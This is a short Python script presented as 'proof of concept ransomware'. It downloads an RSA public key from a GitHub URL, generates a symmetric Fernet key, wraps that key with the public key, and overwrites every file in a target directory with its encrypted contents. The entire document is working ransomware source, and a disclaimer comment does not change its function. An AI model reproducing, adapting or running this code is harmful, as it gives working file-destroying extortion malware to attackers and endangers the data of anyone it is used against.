# This is a proof of concept ransomware and is not to be used for malicious purposes
# This ransomware assumes the target has python3 with the cryptography library installed

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
import glob
import urllib.request
import urllib.parse

# Make a list of targets
targets = glob.glob("/home/admin/target/*")
print("Encrypting:")
print(targets)

# Retrieve and write out public key
url = 'http://raw.githubusercontent.com/Tetoronie/Random-Scripts/master/ransom.pub'
request = urllib.request.urlopen(url)
pkey = request.read().decode('utf-8')
pubkey = open("pwned.pub", "w")
pubkey.write(pkey)
pubkey.close()


# Read Public Key
def read_public (filename = "pwned.pub"):
	with open (filename, "rb") as key_file:
		public_key = serialization.load_pem_public_key(
			key_file.read(),
			backend=default_backend()
		)
	return public_key

public_key = read_public()


# Create and initialize symmetric key
smem = Fernet.generate_key()
skey = Fernet(smem)


# Encrypt and Write Symmetric key
open('smem.enc', "wb").close()
smemENC = public_key.encrypt(
	smem,
	padding.OAEP(
		mgf=padding.MGF1(algorithm=hashes.SHA256()),
		algorithm=hashes.SHA256(),
		label=None
	)
)
with open('smem.enc', "ab") as f: f.write(smemENC)


# Encrypt data with symmetric key, overwrites files
for file in targets:
	with open(file, "rb") as target:
		file_data = target.read()
	encrypt_data = skey.encrypt(file_data)
	with open(file, "wb") as target:
		target.write(encrypt_data)
